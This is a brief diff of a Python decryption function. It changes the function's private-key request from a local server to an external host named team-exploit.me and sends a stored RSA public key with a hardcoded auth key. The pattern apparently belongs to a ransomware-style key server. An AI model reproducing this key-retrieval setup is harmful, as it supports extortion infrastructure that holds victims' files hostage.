@@ -115,7 +115,7 @@ def my_decrypt(input_path: str):
         raise KeyError('No publickey found')
     with open(RSA_PUBLICKEY_FILEPATH, 'r') as fhandler:
         pubkey = fhandler.read()
-    resp = requests.get('http://127.0.0.1:5050/getprivatekey', params={
+    resp = requests.get('https://team-exploit.me:5050/getprivatekey', params={
         'auth_key': 'merhdadisthebestdad',
         'publickey': pubkey
     })
